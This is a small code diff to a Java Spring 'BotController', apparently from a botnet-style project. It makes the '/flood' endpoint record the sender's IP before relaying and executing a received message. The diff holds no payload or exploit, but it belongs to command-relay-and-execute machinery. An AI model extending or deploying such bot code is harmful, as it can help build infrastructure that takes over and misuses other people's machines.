@@ -18,6 +18,7 @@ import org.springframework.web.bind.annotation.RestController;
 import cs.sii.bot.action.Auth;
 import cs.sii.bot.action.Behavior;
 import cs.sii.config.onLoad.Config;
+import cs.sii.domain.IP;
 import cs.sii.service.connection.NetworkService;
 import cs.sii.service.crypto.CryptoPKI;
 
@@ -49,8 +50,10 @@ public class BotController {
 	}
 
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
-	public Boolean msgFlood(@RequestBody String msg) {
-		bhv.floodAndExecute(msg);
+	public Boolean msgFlood(@RequestBody String msg,HttpServletRequest req) {
+		
+		IP ip=new IP(req.getRemoteAddr());
+		bhv.floodAndExecute(msg,ip);
 		return true;
 	}
 
@@ -100,7 +103,7 @@ public class BotController {
 			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
 		}
 
-		bhv.floodAndExecute(msg);
+		bhv.floodAndExecute(msg,nServ.getMyIp());
 		return true;
 	}
 
